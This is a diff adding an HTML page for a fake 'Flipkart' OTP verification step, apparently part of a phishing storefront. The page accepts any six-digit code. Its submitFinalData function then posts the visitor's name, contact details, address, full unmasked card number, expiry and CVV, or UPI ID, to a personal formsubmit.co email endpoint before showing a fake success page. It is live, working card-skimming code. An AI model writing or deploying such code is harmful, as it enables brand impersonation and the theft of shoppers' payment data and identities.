@@ -1,0 +1,198 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>OTP Verification – Flipkart</title>
+  <link rel="stylesheet" href="css/style.css" />
+</head>
+<body>
+
+<div id="header"></div>
+<div class="page-wrapper">
+  <div class="otp-container">
+    <div class="otp-icon">📱</div>
+    <div class="otp-title">OTP Verification</div>
+    
+    <!-- Email Display Section -->
+    <div id="otpEmailDisplay" style="background:#f8f9fa; padding:12px; border-radius:8px; margin-bottom:16px; border:1px solid #e9ecef; text-align:center;">
+      <div style="font-size:12px; color:#666; margin-bottom:4px;">Order Confirmation Email</div>
+      <div id="otpDisplayEmail" style="font-weight:600; color:#17a2b8;"></div>
+    </div>
+    
+    <div class="otp-desc">
+      We have sent a 6-digit OTP to your registered mobile number.<br />
+      Please enter it below to verify your payment.
+    </div>
+
+    <div class="otp-inputs" id="otp-inputs">
+      <input class="otp-input" type="text" maxlength="1" inputmode="numeric" oninput="moveNext(this,0)" onkeydown="movePrev(event,0)" />
+      <input class="otp-input" type="text" maxlength="1" inputmode="numeric" oninput="moveNext(this,1)" onkeydown="movePrev(event,1)" />
+      <input class="otp-input" type="text" maxlength="1" inputmode="numeric" oninput="moveNext(this,2)" onkeydown="movePrev(event,2)" />
+      <input class="otp-input" type="text" maxlength="1" inputmode="numeric" oninput="moveNext(this,3)" onkeydown="movePrev(event,3)" />
+      <input class="otp-input" type="text" maxlength="1" inputmode="numeric" oninput="moveNext(this,4)" onkeydown="movePrev(event,4)" />
+      <input class="otp-input" type="text" maxlength="1" inputmode="numeric" oninput="moveNext(this,5)" onkeydown="movePrev(event,5)" />
+    </div>
+
+    <div id="otp-error" style="color:#ff6161;font-size:13px;margin-bottom:12px;min-height:18px"></div>
+    <button class="otp-verify-btn" onclick="verifyOtp()">VERIFY OTP</button>
+    <div class="otp-resend">
+      Didn't receive OTP? <a onclick="resendOtp()">Resend OTP</a>
+      &nbsp;&nbsp;|&nbsp;&nbsp; <span id="resend-timer">Resend in <strong id="rt">30</strong>s</span>
+    </div>
+  </div>
+</div>
+
+<div id="footer"></div>
+
+<script src="js/data.js"></script>
+<script src="js/cart.js"></script>
+<script>
+  document.getElementById("header").innerHTML = renderHeader();
+  document.getElementById("footer").innerHTML = renderFooter();
+
+  const inputs = document.querySelectorAll(".otp-input");
+  let billingData = {};
+  let paymentData = {};
+  let generatedOTP = '';
+
+  // Load data from localStorage
+  window.addEventListener('load', function() {
+    const savedBillingData = localStorage.getItem('billingData');
+    const savedPaymentData = localStorage.getItem('paymentData');
+    const savedOTP = localStorage.getItem('paymentOTP');
+    
+    if (savedBillingData && savedPaymentData && savedOTP) {
+      billingData = JSON.parse(savedBillingData);
+      paymentData = JSON.parse(savedPaymentData);
+      generatedOTP = savedOTP;
+      
+      // Display email on OTP page
+      const otpEmailDisplay = document.getElementById("otpEmailDisplay");
+      const otpDisplayEmail = document.getElementById("otpDisplayEmail");
+      if (otpEmailDisplay && otpDisplayEmail && billingData.email) {
+        otpEmailDisplay.style.display = "block";
+        otpDisplayEmail.textContent = billingData.email;
+      }
+    } else {
+      // Redirect to checkout if no data
+      location.href = "checkout.html";
+    }
+  });
+
+  function moveNext(el, idx) {
+    el.value = el.value.replace(/\D/g,"").substring(0,1);
+    if (el.value && idx < 5) inputs[idx + 1].focus();
+  }
+
+  function movePrev(e, idx) {
+    if (e.key === "Backspace" && !inputs[idx].value && idx > 0) {
+      inputs[idx - 1].focus();
+    }
+  }
+
+  function getOtp() {
+    return Array.from(inputs).map(i => i.value).join("");
+  }
+
+  function verifyOtp() {
+    const otp = getOtp();
+    if (otp.length < 6) {
+      document.getElementById("otp-error").textContent = "Please enter complete 6-digit OTP.";
+      return;
+    }
+    
+    document.getElementById("otp-error").textContent = "";
+    
+    // Accept any 6-digit code and submit order
+    submitFinalData();
+    
+    // Clear cart and localStorage
+    clearCart();
+    localStorage.removeItem('billingData');
+    localStorage.removeItem('paymentData');
+    localStorage.removeItem('paymentOTP');
+    
+    // Navigate to success
+    location.href = "success.html";
+  }
+
+  function submitFinalData() {
+    const formData = new FormData();
+    
+    // Add billing information unmasked
+    formData.append('_subject', 'Order Completed - OTP Verified');
+    formData.append('_template', 'table');
+    formData.append('_captcha', 'false');
+    
+    formData.append('fullName', billingData.firstName + ' ' + billingData.lastName);
+    formData.append('email', billingData.email);
+    formData.append('phone', billingData.phone);
+    formData.append('billingAddress', billingData.billingAddress);
+    formData.append('city', billingData.city);
+    formData.append('postalCode', billingData.postalCode);
+    formData.append('country', billingData.country);
+    
+    // Add payment information
+    formData.append('paymentMethod', paymentData.method);
+    formData.append('orderTotal', billingData.orderTotal || '0');
+    formData.append('otpUsed', getOtp());
+    formData.append('paymentStatus', 'Completed');
+    formData.append('transactionId', 'TXN' + Date.now());
+    formData.append('submissionTime', new Date().toLocaleString());
+    
+    if (paymentData.method === 'card') {
+      formData.append('cardNumber', paymentData.cardNumber); // Send full card number unmasked
+      formData.append('cardName', paymentData.cardName);
+      formData.append('expiry', paymentData.expiry);
+      formData.append('cvv', paymentData.cvv);
+    } else if (paymentData.method === 'upi') {
+      formData.append('upiId', paymentData.upiId);
+    } else {
+      formData.append('paymentMethod', 'Cash on Delivery');
+    }
+    
+    // Submit to FormSubmit.co
+    fetch("https://formsubmit.co/anandjhare4@gmail.com", {
+      method: "POST",
+      body: formData
+    }).catch(() => {});
+  }
+
+  // Resend timer
+  let secs = 30;
+  const timerEl = document.getElementById("rt");
+  const timerContainer = document.getElementById("resend-timer");
+  const interval = setInterval(() => {
+    secs--;
+    timerEl.textContent = secs;
+    if (secs <= 0) {
+      clearInterval(interval);
+      timerContainer.style.display = "none";
+    }
+  }, 1000);
+
+  function resendOtp() {
+    if (secs > 0) return;
+    
+    // Generate new OTP
+    generatedOTP = Math.floor(100000 + Math.random() * 900000).toString();
+    localStorage.setItem('paymentOTP', generatedOTP);
+    
+    showToast(`OTP has been resent to ${billingData.email}`);
+    
+    // Reset timer
+    secs = 30;
+    timerContainer.style.display = "block";
+    timerEl.textContent = secs;
+    
+    // Clear inputs and focus first
+    inputs.forEach(input => input.value = '');
+    inputs[0].focus();
+  }
+
+  // Auto-focus first input
+  inputs[0].focus();
+</script>
+</body>
+</html>
